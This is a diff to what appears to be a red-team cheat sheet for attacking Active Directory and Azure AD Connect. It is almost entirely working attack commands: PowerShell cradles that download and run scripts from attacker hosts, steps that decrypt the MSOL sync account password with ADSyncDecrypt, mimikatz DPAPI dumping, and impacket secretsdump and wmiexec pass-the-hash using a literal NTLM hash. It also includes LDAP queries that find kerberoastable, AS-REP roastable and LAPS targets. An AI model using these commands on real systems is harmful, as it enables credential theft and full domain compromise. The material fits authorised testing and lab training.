@@ -12,8 +12,69 @@ iex(new-object net.webclient).downloadstring('http://192.168.10.11/sql.txt')
 ```
 invoke-mapdomaintrust | select sourcename,targetname,trustdirection
 ```
-ad abuse backup operator [sauce](https://security.stackexchange.com/questions/182540/how-could-users-in-backup-operators-group-escalate-its-privileges/182549) [sauce2](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf)
+aad enum
+```
+iex(new-object net.webclient).downloadstring('http://192.168.10.11/ad.txt')
+get-ADUser -LDAPFilter "(samAccountName=MSOL_*)" -properties name,description | select name,description | fl
+```
+```
+C:\program files\microsoft azure ad sync\data
+ADSync.mdf
+ADSync_log.LDF
+mv.dsml
+```
+aad exploit - ADSyncDecrypt [sauce](https://github.com/dirkjanm/adconnectdump/tree/master)
+```
+# NOTE: SYSTEM context
+# c#
+upload SharpDPAPI.exe
+.\SharpDPAPI.exe machinetriage
+# powershell
+iex(new-object net.webclient).downloadstring('http://10.10.14.34/dpapi.txt')
+invoke-sharpdpapi machinemasterkeys
+```
+```
+# if dpapi fails, use mimi
+ .\m.exe "privilege::debug" "sekurlsa::dpapi" "exit"
+```
+```
+# force start ADSync - use native AAD tools
+PS C:\Program Files\Microsoft Azure AD Sync\uishell> set-service -name adsync -startuptype automatic
+PS C:\Program Files\Microsoft Azure AD Sync\uishell> set-service -name adsync -status running -passthru
+PS C:\Program Files\Microsoft Azure AD Sync\Bin> Get-ADSyncDatabaseConfiguration
+PS C:\Program Files\Microsoft Azure AD Sync\Bin> Get-ADSyncConnector
+```
+```
+# place ADDecryptSync in AAD\Bin directory
+iwr -uri http://10.10.14.44/mcrypt.dll -outfile .\mcrypt.dll
+iwr -uri http://10.10.14.44/ADSyncDecrypt.exe -outfile .\ADSyncDecrypt.exe
+iwr -uri http://10.10.14.44/ADSyncGather.exe -outfile .\ADSyncGather.exe
+iwr -uri http://10.10.14.44/ADSyncQuery.exe -outfile .\ADSyncQuery.exe
+```
+```
+# do it - ADSyncDecrypt most direct, Gather+Query needs the ADSync.MDF and ADSync_log.LDF files 
+PS C:\Program Files\Microsoft Azure AD Sync\Bin> .\ADSyncDecrypt.exe
 
+<encrypted-attributes>
+ <attribute name="password">HTML_ENCODED_PASSWORD</attribute>
+</encrypted-attributes>
+```
+```
+# html decode
+https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()&input=TmYjb0A3ZiVDR15wfTdmaEFYKmt1Ykg6PW5jOistVnIlQE9UZihEbGl9R1JNQFlZdC9hJXtfWEgld210SShaXXRlUWcrRTA6SncjdlU7KlshXlM3Ni0jQDpKfCQtfCZndDt4LUkpJFJkKk4mYW1wO1RrSXQrdkpuQWFJOyl0b1krSjJtPXk
+```
+```
+# secretsdump
+proxychains -q -f server.conf impacket-secretsdump -just-dc DOMAIN.LOCAL/MSOL_2a1d03e02d11:'HTML_DECODED_PASSWORD'@dc.DOMAIN.local
+```
+aad read adsync logs
+```
+# ADSync module should exist on the box that's using AAD
+Import-Module ADSync
+Get-EventLog -LogName Application -Newest 100 -Source ADSync
+Get-EventLog -LogName Application -Newest 20 | ft -AutoSize -Wrap
+```
+ad abuse backup operator [sauce](https://security.stackexchange.com/questions/182540/how-could-users-in-backup-operators-group-escalate-its-privileges/182549) [sauce2](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf)
 ```
 # first, login as the user with Backup Operator rights
 # or, pth as the user from SYSTEM context using mimikatz or rubeus
@@ -464,6 +525,10 @@ impacket-secretsdump
 ```
 proxychains -q -f met.conf impacket-secretsdump administrator@sccm.domain.local -hashes :1b0cf20be58b57aa85fae91dccc4e63e
 ```
+impacket-wmiexec
+```
+proxychains -q -f server.conf impacket-wmiexec administrator@dc.DOMAIN.local -hashes :1b0cf20be58b57aa85fae91dccc4e63e
+```
 inveigh usage - DNS (inveigh DNS)
 ```
 upload Inveigh462.exe
@@ -514,6 +579,63 @@ iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
 ```
 ```
 Get-DomainComputer | Foreach-Object {$_ | Select name,ms-mcs-admpwd}
+```
+ldapsearch [great sauce, search `search_filter = `](https://github.com/yaap7/ldapsearch-ad/blob/master/ldapsearchad/ldapsearchad.py)
+```
+# basic info
+proxychains -q -f server.conf ldapsearch -H ldap://dc.DOMAIN.local -x -b "" -s base \* +
+```
+```
+# all accounts
+proxychains -q -f server.conf ldapsearch -LLL ldapsearch -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' 'objectClass=account' | tee ldapsearch_accounts.txt
+```
+```
+# all objects
+proxychains -q -f server.conf ldapsearch -LLL ldapsearch -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local'
+```
+```
+# specific account (e.g. ardis)
+proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(cn=ardis)"
+```
+```
+# CA authorities and templates
+proxychains -q -f server.conf ldapsearch -LLL ldapsearch -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=DOMAIN,DC=local" certificateTemplates
+```
+```
+# delegation
+proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+```
+```
+# domain admins
+proxychains -q -f server.conf ldapsearch -x -LLL -H ldap://dc.DOMAIN.local -D "dc\guest" -b "dc=DOMAIN,dc=local" '(memberOf=cn=Domain Admins,cn=Users,dc=DOMAIN,dc=local)' cn
+```
+```
+# exchange servers
+proxychains -q -f server.conf ldapsearch -LLL -H ldap://dc.DOMAIN.local -b "cn=Configuration,dc=DOMAIN,dc=local" -x -D 'dc\guest' -o ldif-wrap=no "(objectCategory=msExchExchangeServer)" dn
+```
+```
+# members of domain admins
+proxychains -q -f server.conf ldapsearch -x -LLL -H ldap://dc.DOMAIN.local -D "dc\guest" -b "dc=DOMAIN,dc=local" '(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=DOMAIN,dc=local)' cn
+```
+```
+# kerberoastable
+proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+```
+```
+# AS-REP roastable
+proxychains -q -f server.conf ldapsearch -LLL -x -H ldap://dc.DOMAIN.local -D 'CN=guest,DC=DOMAIN,DC=local' -b 'DC=DOMAIN,DC=local' "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+```
+```
+# laps
+proxychains -q -f server.conf ldapsearch -LLL -H ldap://dc.DOMAIN.local -b "dc=DOMAIN,dc=local" -x -D 'dc\guest' '(ms-Mcs-AdmPwdExpirationtime=*)' ms-Mcs-AdmPwd
+```
+```
+# replication data
+proxychains -q -f server.conf ldapsearch -LLL -H ldap://dc.DOMAIN.local -b "CN=Administrator,CN=Users,DC=DOMAIN,dc=local" -x -D 'dc\guest' msDS-ReplAttributeMetaData 
+```
+ldapsearch.py info
+```
+proxychains -q -f server.conf python3 ./ldapsearch-ad.py -l dc.DOMAIN.local -t info
 ```
 linux qol
 ```
